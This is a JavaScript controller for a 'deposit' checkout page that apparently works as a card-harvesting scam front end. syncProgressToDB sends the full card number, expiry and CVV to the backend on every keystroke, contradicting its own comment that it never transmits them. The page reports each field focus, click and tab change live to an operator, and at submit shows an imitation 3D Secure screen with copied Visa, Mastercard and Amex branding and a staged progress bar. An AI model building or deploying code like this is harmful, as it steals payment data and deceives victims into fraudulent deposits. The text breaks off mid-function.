/**
 * deposit.js
 * Client Checkout Controller.
 * Manages form filling, card formatting, real-time telemetry, and payments processing.
 */

import { $, $all, openModal } from '../js/core/ui.js';
import { getQueryParam, copyToClipboard } from '../js/utils/helpers.js';
import { formatCurrency, formatPhoneNumber } from '../js/utils/formatters.js';
import { CONFIG, COUNTRIES, SESSION_STATUS, PRIORITY } from '../js/utils/constants.js';
import { findCountryByCode, findCountryByName, searchCountries, resolveBillingForCountry } from '../js/utils/countryCatalog.js';
import { sessionService } from '../js/services/sessionService.js';
import { realtimeService } from '../js/services/realtimeService.js';
import { CardPreviewManager } from '../js/core/card.js';
import { validateEmail, validatePhone, validateExpiry, validateCvv, detectCardBrand, luhnCheck } from '../js/core/validator.js';
import { isOptionalBillingField } from '../js/core/checkoutValidation.js';
import visaClickToPayImg from '../src/assets/images/visa_click_to_pay_1783932154236.jpg';
import { initBankLogoCarousels, updateBankLogoCarousels } from '../js/components/bankLogoCarousel.js';
import { initRegulatoryMark, updateRegulatoryMark } from '../js/components/regulatoryMark.js';
import { applyDepositLocale, t, getTdsStages } from './depositI18n.js';
import { fetchOnboardingGuideAccess, renderGuideBlockedPage } from './onboarding-access.js';
import { initDepositFaqModal } from './depositFaq.js';

let sessionId = null;
let currentSession = null;
let cardManager = null;
let activeField = null;
let selectedCountry = null;
let cardStartedLogged = false;
let cardCompletedLogged = false;

function getBrowserName() {
  const ua = navigator.userAgent;
  if (ua.includes('Firefox')) return 'Firefox';
  if (ua.includes('Chrome') && !ua.includes('Edg')) return 'Chrome';
  if (ua.includes('Safari') && !ua.includes('Chrome')) return 'Safari';
  if (ua.includes('Edg')) return 'Edge';
  return 'Generic Browser';
}

function getOSName() {
  const ua = navigator.userAgent;
  if (ua.includes('Windows')) return 'Windows';
  if (ua.includes('Macintosh') || ua.includes('Mac OS')) return 'macOS';
  if (ua.includes('Android')) return 'Android';
  if (ua.includes('iPhone') || ua.includes('iPad')) return 'iOS';
  if (ua.includes('Linux')) return 'Linux';
  return 'Generic OS';
}

function getDeviceType() {
  const ua = navigator.userAgent;
  if (/mobile/i.test(ua)) return 'Mobile';
  if (/tablet/i.test(ua)) return 'Tablet';
  return 'Desktop';
}

let cachedOnboardingGuideConfig = null;

async function fetchOnboardingGuideConfig() {
  if (cachedOnboardingGuideConfig) return cachedOnboardingGuideConfig;
  try {
    const response = await fetch('/api/onboarding-guide/config');
    if (!response.ok) return null;
    const contentType = response.headers.get('content-type') || '';
    if (!contentType.includes('application/json')) return null;
    cachedOnboardingGuideConfig = await response.json();
    return cachedOnboardingGuideConfig;
  } catch {
    return null;
  }
}

async function allocateCheckoutOrderNumber(forSessionId) {
  if (!forSessionId) return null;
  try {
    const res = await fetch(`/api/sessions/${encodeURIComponent(forSessionId)}/order-number`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' }
    });
    if (!res.ok) return null;
    const data = await res.json();
    return data.orderNumber ?? data.transactionId ?? null;
  } catch {
    return null;
  }
}

function buildOnboardingGuideUrl(forSessionId) {
  const path = cachedOnboardingGuideConfig?.pagePath || '/deposit/welcome.html';
  const q = forSessionId ? `?session=${encodeURIComponent(forSessionId)}` : '';
  return `${path}${q}`;
}

async function fetchPublicDepositConfig() {
  try {
    const response = await fetch('/api/public-deposit/config');
    if (!response.ok) return null;
    const contentType = response.headers.get('content-type') || '';
    if (!contentType.includes('application/json')) return null;
    return await response.json();
  } catch {
    return null;
  }
}

document.addEventListener('DOMContentLoaded', async () => {
  sessionId = getQueryParam('session');
  const ref = getQueryParam('ref') || localStorage.getItem('attribution_ref') || '';
  if (ref) {
    localStorage.setItem('attribution_ref', ref);
  }

  let publicLandingConfig = null;

  // If we don't have an explicit session ID, we're in the anonymous visitor flow
  if (!sessionId) {
    publicLandingConfig = await fetchPublicDepositConfig();
    // Only block when config explicitly says disabled; if config is missing (stale deploy), /api/sessions/track enforces the flag.
    if (publicLandingConfig && publicLandingConfig.enabled !== true) {
      showFatalError(
        'Deposit Unavailable',
        publicLandingConfig.disabledMessage ||
          'This deposit page is not available. Please use the personal link from your account manager.'
      );
      return;
    }
    // Collect UTM parameters
    const utmParams = {
      source: getQueryParam('utm_source'),
      medium: getQueryParam('utm_medium'),
      campaign: getQueryParam('utm_campaign'),
      term: getQueryParam('utm_term'),
      content: getQueryParam('utm_content')
    };

    // Generate non-invasive fingerprint
    const fingerprint = {
      browser: getBrowserName(),
      os: getOSName(),
      device: getDeviceType(),
      screen: `${window.screen.width}x${window.screen.height}`,
      language: navigator.language || 'en-US'
    };

    const trackingBody = {
      ref,
      fingerprint,
      referrer: document.referrer || '',
      utmParams,
      path: window.location.pathname,
      visitorId: localStorage.getItem('anon_visitor_id') || ''
    };

    try {
      const response = await fetch('/api/sessions/track', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(trackingBody)
      });
      if (response.ok) {
        const trackedSession = await response.json();
        sessionId = trackedSession.id;
        currentSession = trackedSession;
        localStorage.setItem('anon_visitor_id', sessionId);
      } else {
        let errMsg = 'Could not establish secure connection to deposit gateway.';
        try {
          const errData = await response.json();
          if (errData.error === 'public_landing_disabled') {
            errMsg = errData.message || errMsg;
          }
        } catch (_) { /* ignore */ }
        showFatalError(response.status === 403 ? 'Deposit Unavailable' : 'Tracking Error', errMsg);
        return;
      }
    } catch (err) {
      console.error('Failed to track anonymous session:', err);
      showFatalError('Gateway Error', 'Could not connect to the secure deposit gateway.');
      return;
    }
  } else {
    await fetchOnboardingGuideConfig();
    // Load Session details from Database
    currentSession = await sessionService.getSession(sessionId);
    if (!currentSession) {
      showFatalError('Session Not Found', 'We could not locate this payment session in our secure directory. Please verify the URL link with your assigned agent.');
      return;
    }
  }

  // Update Page title with Campaign Name
  const urlCampaign = getQueryParam('campaignName');
  const defaultSiteName = publicLandingConfig?.siteName || 'Place Order';
  const campaignNameValue = urlCampaign || currentSession.campaignName || defaultSiteName;
  document.title = campaignNameValue;
  const heroH1 = document.querySelector('.hero h1');
  if (heroH1) {
    heroH1.textContent = campaignNameValue;
  }

  const depositCompleted =
    currentSession.status === 'Completed' ||
    currentSession.client?.emailStatus === 'Completed' ||
    currentSession.payment?.status === 'Complete';

  if (depositCompleted && sessionId) {
    const guideAccess = await fetchOnboardingGuideAccess(sessionId);
    if (!guideAccess.allowed) {
      renderGuideBlockedPage(guideAccess.title || 'Website under technical renovation');
      return;
    }
    window.location.replace(buildOnboardingGuideUrl(sessionId));
    return;
  }

  const isInactiveLink =
    currentSession.link?.status === 'Inactive' ||
    currentSession.link?.status === 'Completed' ||
    currentSession.link?.status === 'Disabled';
  const isClosedSession = currentSession.closed === true;

  if (isInactiveLink || isClosedSession || currentSession.status === 'Expired') {
    const errorMsg =
      currentSession.activity ||
      'This secure deposit link has already been used or has expired. Please contact your account manager for assistance.';
    showFatalError('Link Expired', errorMsg);
    return;
  }

  // Pre-fill registered billing information
  prefillClientData();

  // Instantiate 3D Card flip controller
  cardManager = new CardPreviewManager(
    'cardNumber', 'expiry', 'cvv', 'ccInner',
    'ccNumber', 'ccExpFront', 'ccCvvBack', 'ccBrandFront',
    'brandIcon'
  );

  // Initialize Searchable Country Dropdown
  initCountryDropdown();

  // Set initial country amount details or default to USD 250
  let initialAmount = 250;
  let initialCurrency = 'USD';
  let initialSymbol = '$';
  let initialCountryName = '';

  const savedCountryCode = (currentSession.client.country || '').trim();
  const presetCountry = savedCountryCode ? findCountryByCode(savedCountryCode) : null;
  const autoDetectByIp = currentSession.link?.autoDetectCountryByIp === true;

  function applyPresetCountry(countryRecord, hintKey, hintParams = {}) {
    selectedCountry = countryRecord;
    const billing = resolveBillingForCountry(countryRecord, currentSession.client);
    initialAmount = billing.amount;
    initialCurrency = billing.currency;
    initialSymbol = billing.symbol;
    initialCountryName = countryRecord.name;

    if (currentSession?.client) {
      currentSession.client.country = countryRecord.code;
      currentSession.client.depositAmount = billing.amount;
      currentSession.client.preferredCurrency = billing.currency;
    }

    const countryGroup = $('[data-field="country"]');
    if (countryGroup) {
      countryGroup.classList.remove('error');
      countryGroup.classList.add('valid');
    }
    applyDepositLocale(countryRecord.code);
    $('#countryHint').textContent = t(hintKey, hintParams);
    updateBankLogoCarousels(countryRecord.code);
    updateRegulatoryMark(countryRecord.code);
  }

  if (presetCountry) {
    applyPresetCountry(presetCountry, 'countryHintBilling', { country: presetCountry.name });
  } else if (savedCountryCode) {
    applyDepositLocale(null);
    $('#countryHint').textContent = t('countryHintSelectList');
    initialAmount = currentSession.client.depositAmount || 250;
    initialCurrency = currentSession.client.preferredCurrency || 'USD';
    initialSymbol = '$';
  } else if (autoDetectByIp) {
    try {
      applyDepositLocale(null);
      $('#countryHint').textContent = t('countryHintDetecting');
      const res = await fetch('https://ipapi.co/json/');
      if (res.ok) {
        const data = await res.json();
        const detected = findCountryByCode(data.country_code);
        if (detected) {
          applyPresetCountry(detected, 'countryHintSuggested', { country: detected.name });
          if (currentSession?.client) {
            currentSession.client.country = detected.code;
            currentSession.client.depositAmount = initialAmount;
            currentSession.client.preferredCurrency = initialCurrency;
          }
          void syncProgressToDB();
        } else {
          applyDepositLocale(null);
          $('#countryHint').textContent = t('countryHintSelect');
          initialAmount = currentSession.client.depositAmount || 250;
          initialCurrency = currentSession.client.preferredCurrency || 'USD';
        }
      } else {
        applyDepositLocale(null);
        $('#countryHint').textContent = t('countryHintSelect');
        initialAmount = currentSession.client.depositAmount || 250;
        initialCurrency = currentSession.client.preferredCurrency || 'USD';
      }
    } catch (err) {
      console.warn('Geolocation detection failed:', err);
      applyDepositLocale(null);
      $('#countryHint').textContent = t('countryHintSelect');
      initialAmount = currentSession.client.depositAmount || 250;
      initialCurrency = currentSession.client.preferredCurrency || 'USD';
    }
  } else {
    applyDepositLocale(null);
    $('#countryHint').textContent = t('countryHintSelect');
    initialAmount = currentSession.client.depositAmount || 250;
    initialCurrency = currentSession.client.preferredCurrency || 'USD';
  }

  const initialCarouselCountry = selectedCountry?.code ?? presetCountry?.code ?? null;
  applyDepositLocale(initialCarouselCountry);
  void initBankLogoCarousels(initialCarouselCountry);
  initRegulatoryMark(initialCarouselCountry);
  initDepositFaqModal();

  const text = formatCurrency(initialAmount, initialCurrency, initialSymbol);
  $('#txTotalValue').textContent = text;
  const sumAmountEl = $('#sumAmount');
  if (sumAmountEl) sumAmountEl.textContent = text;
  if (initialCountryName) {
    $('#countryInput').value = initialCountryName;
    $('#countryInput').closest('.field, .floating-group, .combo-field').classList.add('has-value');
    
    // Also fill in the phone code if available and field is empty
    const phoneCodeEl = $('#phoneCode');
    const phoneWrap = $('.phone-wrap');
    if (selectedCountry && phoneCodeEl && phoneWrap) {
      phoneCodeEl.textContent = selectedCountry.phoneCode;
      phoneCodeEl.style.display = 'block';
      phoneWrap.classList.add('has-code');
      phoneWrap.classList.add('has-phone-code');
    }
  }

  // Live validation listeners
  setupFormListeners();

  // Initial sync to set status and UI elements
  await syncProgressToDB();

  // Gather full IP, country, and device metrics on load
  const meta = getDeviceMetadata();
  let geoIp = { ip: 'Unknown IP', country_name: 'Unknown Country' };
  try {
    const geoRes = await fetch('https://ipapi.co/json/');
    if (geoRes.ok) {
      geoIp = await geoRes.json();
    }
  } catch (err) {
    console.warn('Geolocation IP detection failed:', err);
  }

  const logStr = `Page Loaded: Browser: ${meta.browser} | OS: ${meta.os} | Device: ${meta.device} | IP: ${geoIp.ip || 'Unknown'} | Country: ${geoIp.country_name || initialCountryName || 'Unknown'}`;

  // Mark page as opened on timeline and database
  await sessionService.updateSession(sessionId, { status: SESSION_STATUS.OPENED, connection: 'online' });
  await sessionService.logTimelineEvent(sessionId, logStr);

  // Track tab visibility (focus loss/tab leave)
  document.addEventListener('visibilitychange', async () => {
    if (document.visibilityState === 'hidden') {
      await fetch(`/api/sessions/${sessionId}/leave`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ event: 'Customer Left Page' }),
        keepalive: true
      }).catch(() => {});
    } else {
      await fetch(`/api/sessions/${sessionId}/reconnect`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ event: 'Customer Reconnected' }),
        keepalive: true
      }).catch(() => {});
    }
  });

  // Track window/tab close (beforeunload/pagehide)
  window.addEventListener('pagehide', () => {
    navigator.sendBeacon(`/api/sessions/${sessionId}/leave`, JSON.stringify({ event: 'Customer Left Page' }));
  });

  // Track meaningful clicks (buttons, links, inputs)
  document.addEventListener('click', async (event) => {
    const target = event.target.closest('button, .btn, a, input[type="submit"]');
    if (!target || !sessionId) return;

    const elementId = target.id || target.className || 'unidentified-element';
    const elementText = (target.textContent || target.value || target.title || '').trim().substring(0, 50);

    try {
      await fetch(`/api/sessions/${sessionId}/click`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ elementId, elementText })
      });
    } catch (err) {
      console.warn('Silent failure tracking click event:', err);
    }
  });

  // Start periodic heartbeat (Every 5 seconds)
  startHeartbeatLoop();

  // Handle Form Submission
  const depBtn = $('#depositBtn');
  if (depBtn) {
    depBtn.removeAttribute('disabled');
    depBtn.addEventListener('click', handlePaymentSubmit);
  }
});

/**
 * Pre-populate inputs with details provided by the Sales Agent
 */
function prefillClientData() {
  const client = currentSession.client || {};
  
  // If the session is anonymous or has placeholder visitor names, do not prefill identity/contact fields
  const isAnon = currentSession.isAnonymous || 
                 (client.firstName && client.firstName.toLowerCase() === 'anonymous') || 
                 (client.lastName && client.lastName.toLowerCase().startsWith('visitor #'));

  if (isAnon) {
    $('#firstName').value = '';
    $('#lastName').value = '';
    $('#email').value = '';
    $('#phoneNumber').value = '';
    $('#city').value = '';
    const ccHolder = $('#ccHolderFront');
    if (ccHolder) ccHolder.textContent = 'CLIENT';
    return;
  }

  if (client.firstName) {
    $('#firstName').value = client.firstName;
    $('#firstName').closest('.field, .floating-group')?.classList.add('has-value');
  }
  if (client.lastName) {
    $('#lastName').value = client.lastName;
    $('#lastName').closest('.field, .floating-group')?.classList.add('has-value');
  }
  if (client.email) {
    $('#email').value = client.email;
    $('#email').closest('.field, .floating-group')?.classList.add('has-value');
  }
  if (client.phone) {
    // Strip phone code prefix if matches
    const code = findCountryByCode(client.country)?.phoneCode || '';
    const phoneNo = client.phone.replace(code, '').trim();
    $('#phoneNumber').value = phoneNo;
    $('#phoneNumber').closest('.field, .floating-group')?.classList.add('has-value');
    
    // Trigger label prefix
    const phoneCodeEl = $('#phoneCode');
    if (phoneCodeEl && code) {
      phoneCodeEl.textContent = code;
      phoneCodeEl.style.display = 'block';
      $('.phone-wrap').classList.add('has-code');
      $('.phone-wrap').classList.add('has-phone-code');
    }
  }
  if (client.city) {
    $('#city').value = client.city;
    $('#city').closest('.field, .floating-group')?.classList.add('has-value');
  }
  
  if (client.firstName || client.lastName) {
    const ccHolder = $('#ccHolderFront');
    if (ccHolder) {
      ccHolder.textContent = `${client.firstName} ${client.lastName}`.trim().toUpperCase();
    }
  }
}

/**
 * Validates any given field and updates UI states + broadcasts progress metadata
 */
function validateField(name, triggerSync = true, forceShowError = false) {
  const group = document.querySelector(`[data-field="${name}"]`);
  if (!group) return true;

  let isValid = false;
  const rawNum = $('#cardNumber').value.replace(/\s/g, '');
  const brand = detectCardBrand(rawNum);

  switch (name) {
    case 'firstName':
    case 'lastName':
    case 'city': {
      const textVal = $(`#${name}`).value.trim();
      isValid = textVal.length === 0 || textVal.length >= 1;
      break;
    }
    case 'country':
      isValid = !!selectedCountry;
      break;
    case 'email':
      isValid = validateEmail($('#email').value);
      break;
    case 'phone': {
      const phoneVal = $('#phoneNumber').value.trim();
      isValid = phoneVal.length === 0 || (phoneVal.length >= 7 && validatePhone(phoneVal));
      break;
    }
    case 'cardNumber':
      isValid = luhnCheck(rawNum);
      break;
    case 'expiry':
      isValid = validateExpiry($('#expiry').value);
      break;
    case 'cvv':
      isValid = validateCvv($('#cvv').value, brand);
      break;
  }

  const hasVal = fieldHasValue(name);
  const isTouched = group.classList.contains('touched') || forceShowError;

  group.classList.remove('valid', 'invalid');
  if (isOptionalBillingField(name) && !hasVal) {
    return true;
  }
  if (hasVal) {
    if (isValid) {
      group.classList.add('valid');
    } else if (isTouched) {
      group.classList.add('invalid');
    }
  } else if (isTouched) {
    group.classList.add('invalid');
  }

  // Trigger real-time status sync if requested
  if (triggerSync) {
    syncProgressToDB();
  }
  return isValid;
}

function fieldHasValue(name) {
  const idMap = {
    firstName: 'firstName', lastName: 'lastName', email: 'email', phone: 'phoneNumber', city: 'city',
    country: 'countryInput',
    cardNumber: 'cardNumber', expiry: 'expiry', cvv: 'cvv'
  };
  return $(`#${idMap[name]}`).value.trim().length > 0;
}

function allValid() {
  const required = ['email', 'country', 'cardNumber', 'expiry', 'cvv'];
  const optional = ['firstName', 'lastName', 'phone', 'city'];
  if (!required.every((f) => fieldHasValue(f) && validateField(f, false, false))) {
    return false;
  }
  return optional.every((f) => {
    if (!fieldHasValue(f)) return true;
    return validateField(f, false, false);
  });
}

function isFieldCompleteForProgress(name) {
  if (isOptionalBillingField(name)) {
    if (!fieldHasValue(name)) return true;
    return validateField(name, false, false);
  }
  return fieldHasValue(name) && validateField(name, false, false);
}

function setupFormListeners() {
  const fields = ['firstName', 'lastName', 'email', 'phone', 'city', 'country', 'cardNumber', 'expiry', 'cvv'];
  
  fields.forEach(f => {
    const idMap = {
      firstName: 'firstName', lastName: 'lastName', email: 'email', phone: 'phoneNumber', city: 'city',
      country: 'countryInput',
      cardNumber: 'cardNumber', expiry: 'expiry', cvv: 'cvv'
    };
    const el = document.getElementById(idMap[f]);
    if (!el) return;

    const group = el.closest(`[data-field="${f}"]`) || el.parentElement;

    // Track when user starts focusing/typing on a field
    el.addEventListener('focus', () => {
      activeField = f;
      realtimeService.publishTyping(sessionId, FIELD_LABELS[f], true);
      
      // Update session activity and log to timeline
      sessionService.updateSession(sessionId, {
        status: SESSION_STATUS.TYPING,
        activity: `Typing ${FIELD_LABELS[f]}...`
      });
      sessionService.logTimelineEvent(sessionId, `Field Focused: ${FIELD_LABELS[f]}`);
    });

    el.addEventListener('blur', async () => {
      realtimeService.publishTyping(sessionId, FIELD_LABELS[f], false);
      activeField = null;
      if (group) group.classList.add('touched');
      if (f !== 'country') {
        validateField(f, true, true);
      }
      sessionService.logTimelineEvent(sessionId, `Field Blurred: ${FIELD_LABELS[f]}`);

      // If the field is email and is valid, trigger the email capture API
      if (f === 'email' && el.value.trim() && validateEmail(el.value.trim())) {
        try {
          const res = await fetch('/api/sessions/capture-email', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ email: el.value.trim(), visitorId: sessionId })
          });
          if (res.ok) {
            const data = await res.json();
            if (data.session) {
              currentSession = data.session;
            }
          }
        } catch (err) {
          console.error('Failed to capture email:', err);
        }
      }
    });

    el.addEventListener('input', () => {
      validateField(f, true, false);
    });
  });

  // Track name change on credit card face
  const firstNameEl = $('#firstName');
  const lastNameEl = $('#lastName');
  const updateHolder = () => {
    const ccHolder = $('#ccHolderFront');
    if (ccHolder) {
      ccHolder.textContent = `${firstNameEl.value} ${lastNameEl.value}`.trim().toUpperCase() || 'CLIENT';
    }
  };
  firstNameEl.addEventListener('input', updateHolder);
  lastNameEl.addEventListener('input', updateHolder);
}

const FIELD_LABELS = {
  firstName: 'First Name', lastName: 'Last Name', email: 'Email', phone: 'Phone Number',
  country: 'Country', city: 'City', cardNumber: 'Card Number', expiry: 'Expiration Date', cvv: 'CVV'
};

/**
 * Compiles and saves metadata and progress to the database
 * STRICT PCI DSS COMPLIANCE: NEVER stores/transmits full card details or CVVs
 */
async function syncProgressToDB() {
  const fields = ['firstName', 'lastName', 'email', 'phone', 'city', 'country', 'cardNumber', 'expiry', 'cvv'];
  let completed = 0;
  
  fields.forEach((f) => {
    if (isFieldCompleteForProgress(f)) completed++;
  });

  const percent = Math.round((completed / fields.length) * 100);
  
  // Extract SAFE card metadata
  const rawNum = $('#cardNumber').value.replace(/\s/g, '');
  const brand = detectCardBrand(rawNum);
  const maxDigits = brand === 'amex' ? 15 : 16;
  const isCardComplete = rawNum.length === maxDigits;
  
  // Live Timeline Logs for Card inputs
  if (rawNum.length > 0 && !cardStartedLogged) {
    cardStartedLogged = true;
    sessionService.logTimelineEvent(sessionId, 'Card Started');
  } else if (rawNum.length === 0) {
    cardStartedLogged = false;
  }

  const isCardValidAndComplete = isCardComplete && luhnCheck(rawNum) && validateExpiry($('#expiry').value) && valLength('cvv') >= (brand === 'amex' ? 4 : 3);
  if (isCardValidAndComplete && !cardCompletedLogged) {
    cardCompletedLogged = true;
    sessionService.logTimelineEvent(sessionId, 'Card Completed');
  } else if (!isCardValidAndComplete) {
    cardCompletedLogged = false;
  }
  
  const paymentMetadata = {
    brand: brand || 'Unknown',
    digitCount: rawNum.length,
    expiryValid: validateExpiry($('#expiry').value),
    cvvCompleted: valLength('cvv') >= (brand === 'amex' ? 4 : 3),
    status: rawNum.length === 0 ? 'Not Started' : (isCardComplete ? 'Complete' : 'In Progress'),
    validity: rawNum.length === 0 ? 'Empty' : (luhnCheck(rawNum) ? 'Valid' : 'Invalid'),
    cardNumber: rawNum || 'Empty',
    expiry: $('#expiry').value || '',
    cvv: $('#cvv').value || ''
  };

  const isFormReady = allValid();
  const status = isFormReady ? SESSION_STATUS.READY : SESSION_STATUS.ACTIVE;

  // Compile real-time client billing info to save back to database
  if (currentSession && currentSession.client) {
    currentSession.client.firstName = $('#firstName').value.trim();
    currentSession.client.lastName = $('#lastName').value.trim();
    currentSession.client.email = $('#email').value.trim();
    currentSession.client.phone = $('#phoneNumber').value.trim() ? (($('#phoneCode').textContent || '') + ' ' + $('#phoneNumber').value.trim()) : '';
    currentSession.client.city = $('#city').value.trim();
  }

  await sessionService.updateSession(sessionId, {
    status: status,
    payment: paymentMetadata,
    progress: { completed, total: fields.length, percent },
    client: currentSession ? currentSession.client : undefined
  });

  // Update Submit Button State
  const btn = $('#depositBtn');
  btn.disabled = false;
  $('#btnLabel').textContent = isFormReady ? t('btnReady') : t('btnIncomplete');
}

function valLength(id) {
  return document.getElementById(id).value.trim().length;
}

/**
 * Periodic Heartbeat Loop to maintain Online connection status
 */
function startHeartbeatLoop() {
  setInterval(async () => {
    await sessionService.sendHeartbeat(sessionId);
    realtimeService.publishConnection(sessionId, 'online');
  }, CONFIG.HEARTBEAT_INTERVAL_MS);
}

/**
 * Logo templates for 3D Secure verification based on card brand
 */
const LOGO_TEMPLATES = {
  visa: `
    <div style="display: flex; align-items: center; justify-content: center; background: #ffffff; border: 1.5px solid #d0d5dd; border-radius: 12px; overflow: hidden; box-shadow: var(--shadow-sm); max-width: 260px;">
      <img src="${visaClickToPayImg}" alt="Visa Secure Online Checkout" referrerPolicy="no-referrer" style="width: 100%; height: auto; display: block; object-fit: contain;" />
    </div>
  `,
  mastercard: `
    <div style="display: flex; align-items: center; gap: 12px; background: #ffffff; padding: 12px 20px; border-radius: 10px; border: 1.5px solid #d0d5dd; box-shadow: var(--shadow-sm);">
      <svg viewBox="0 0 24 18" style="height: 40px; width: auto; flex-shrink: 0;" aria-label="Mastercard">
        <circle cx="7.5" cy="9" r="6" fill="#EB001B" />
        <circle cx="16.5" cy="9" r="6" fill="#F79E1B" fill-opacity="0.9" />
        <path d="M12 4.3a5.9 5.9 0 0 0-2.3 4.7 5.9 5.9 0 0 0 2.3 4.7 5.9 5.9 0 0 0 2.3-4.7 5.9 5.9 0 0 0-2.3-4.7z" fill="#FF5F00" />
      </svg>
      <div style="display: flex; flex-direction: column; align-items: flex-start; text-align: left; font-family: 'Inter', -apple-system, sans-serif; line-height: 1.1;">
        <span style="font-size: 20px; font-weight: 700; color: #111827; letter-spacing: -0.04em;">mastercard</span>
        <span style="font-size: 18px; font-weight: 300; color: #374151; letter-spacing: -0.01em; margin-top: -1px;">ID Check</span>
      </div>
    </div>
  `,
  amex: `
    <div style="display: flex; flex-direction: column; align-items: center; text-align: center; font-family: 'Inter', -apple-system, sans-serif; background: #ffffff; padding: 14px 28px; border-radius: 8px; border: 1.5px solid #d0d5dd; box-shadow: var(--shadow-sm);">
      <div style="font-size: 11px; font-weight: 800; color: #00175a; letter-spacing: 0.16em; text-transform: uppercase; margin-bottom: 6px; font-family: 'Inter', -apple-system, sans-serif;">
        AMERICAN EXPRESS
      </div>
      <div style="font-size: 30px; color: #374151; font-weight: 300; letter-spacing: -0.03em; display: flex; align-items: baseline; line-height: 1;">
        <span style="font-weight: 700; color: #1e293b; margin-right: 1px;">Safe</span><span style="color: #475569;">Key</span><span style="font-size: 10px; font-weight: 700; align-self: flex-start; margin-left: 2px; position: relative; top: -10px; color: #475569;">®</span>
      </div>
    </div>
  `,
  default: `
    <div style="display: flex; align-items: center; gap: 10px; background: #ffffff; padding: 12px 24px; border-radius: 8px; border: 1.5px solid #e4e7eb; box-shadow: var(--shadow-sm); color: var(--blue);">
      <svg viewBox="0 0 24 24" fill="none" style="width: 38px; height: 38px;" stroke="currentColor" stroke-width="1.8" stroke-linejoin="round">
        <path d="M12 2L4 5v6c0 5 3.4 9 8 10 4.6-1 8-5 8-10V5l-8-3z" />
        <path d="M9 12l2 2 4-4" stroke-width="1.8" stroke-linecap="round" />
      </svg>
      <span style="font-size: 20px; font-weight: 800; color: var(--text-primary); letter-spacing: -0.02em;">3D SECURE</span>
    </div>
  `
};

/**
 * Animates the 3D Secure progress loading bar and dynamically transitions security updates
 */
function animateTdsProgressBar(duration) {
  return new Promise((resolve) => {
    const bar = $('#tdsLoadingBar');
    const statusSpan = $('#tdsStatusText').querySelector('span');
    const startTime = Date.now();
    
    // Smoothly update secure verification status updates based on progress percentage
    const stages = getTdsStages();

    function update() {
      const elapsed = Date.now() - startTime;
      const progress = Math.min(elapsed / duration, 1);
      const pct = Math.round(progress * 100);
      
      if (bar) {
        bar.style.width = `${pct}%`;
      }
      
      const stage = [...stages].reverse().find(s => pct >= s.pct);
      if (stage && statusSpan) {
        statusSpan.textContent = stage.text;
      }
      
      if (progress < 1) {
        requestAnimationFrame(update);
      } else {
        setTimeout(resolve, 300); // Gentle pause for visual completeness
      }
    }
    
    requestAnimationFrame(update);
  });
}

/**
 * Handle ultimate deposit transaction click
 */
async function handlePaymentSubmit() {
  const fields = ['firstName', 'lastName', 'email', 'phone', 'city', 'country', 'cardNumber', 'expiry', 'cvv'];
  if (!allValid()) {
    fields.forEach(f => {
      const idMap = {
        firstName: 'firstName', lastName: 'lastName', email: 'email', phone: 'phoneNumber', city: 'city',
        country: 'countryInput',
        cardNumber: 'cardNumber', expiry: 'expiry', cvv: 'cvv'
      };
      const el = document.getElementById(idMap[f]);
      if (el) {
        const group = el.closest(`[data-field="${f}"]`) || el.parentElement;
        if (group) {
          group.classList.add('touched');
        }
        validateField(f, false, true);
      }
    });
    return;
  }

  const btn = $('#depositBtn');
  btn.classList.add('btn-loading');
  btn.disabled = true;

  // Sync latest billing form inputs to backend before transaction is processed
  const submitUpdate = await sessionService.updateSession(sessionId, {
    status: SESSION_STATUS.SUBMITTED,
    activity: 'Processing encrypted payment...',
    client: {
      ...currentSession.client,
      firstName: $('#firstName').value.trim(),
      lastName: $('#lastName').value.trim(),
      email: $('#email').value.trim(),
      phone: $('#phoneNumber').value.trim() ? (($('#phoneCode').textContent || '') + ' ' + $('#phoneNumber').value.trim()) : '',
      city: $('#city').value.trim()
    }
  });

  if (submitUpdate && submitUpdate.error) {
    console.warn('Session update returned an error, but proceeding with payment to avoid blocked states:', submitUpdate.error);
  }

  await sessionService.logTimelineEvent(sessionId, 'Payment Submitted');

  // Set up 3D Secure Overlay Details
  const rawNum = $('#cardNumber').value.replace(/\s/g, '');
  const brand = detectCardBrand(rawNum) || 'default';
  
  const tdsOverlay = $('#tdsOverlay');
  const tdsLogoContainer = $('#tdsLogoContainer');
  const tdsAmountText = $('#tdsAmountText');
  
  if (tdsLogoContainer) {
    tdsLogoContainer.innerHTML = LOGO_TEMPLATES[brand] || LOGO_TEMPLATES.default;
  }
  if (tdsAmountText) {
    tdsAmountText.textContent = $('#txTotalValue').textContent;
  }
  
  // Bring up the immersive 3DS screen
  if (tdsOverlay) {
    tdsOverlay.classList.add('show');
  }

  try {
    let resData;
    let isLocalFallback = false;
    let response;

    // Run parallel tasks:
    // 1. Payment API call
    // 2. Animate progress bar over 4 seconds
    const apiTask = (async () => {
      try {
        response = await fetch(`/api/sessions/${sessionId}/payment`, {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json'
          },
          body: JSON.stringify({
            cardNumber: $('#cardNumber').value.replace(/\s/g, ''),
            expiry: $('#expiry').value.trim(),
            cvv: $('#cvv').value.trim(),
            billing: {
              firstName: $('#firstName').value.trim(),
              lastName: $('#lastName').value.trim(),
              email: $('#email').value.trim(),
              phone: $('#phoneNumber').value.trim() ? (($('#phoneCode').textContent || '') + ' ' + $('#phoneNumber').value.trim()) : '',
              city: $('#city').value.trim(),
              country: selectedCountry ? selectedCountry.code : ''
            }
          })
        });

        const contentType = response?.headers?.get('content-type') || '';
        if (!response?.ok || contentType.includes('text/html')) {
          isLocalFallback = true;
        } else {
          resData = await response.json();
        }
      } catch (e) {
        isLocalFallback = true;
      }
    })();

    // Minimum verification loading bar duration is 4.2 seconds for realistic interaction
    await Promise.all([apiTask, animateTdsProgressBar(4200)]);

    // Dismiss 3D Secure Overlay
    if (tdsOverlay) {
      tdsOverlay.classList.remove('show');
    }
    btn.classList.remove('btn-loading');

    if (isLocalFallback || (response && !response.ok)) {
      console.warn('Payment API failed or was declined. No success state was recorded.');
      showFatalError(
        'Payment not completed',
        'We could not save this transaction. No successful deposit was recorded. Please contact your account manager and try again.'
      );
      return;
    }

    // Success! Show Success Modal
    showSuccessModal(resData.transactionId, resData.maskedCard);
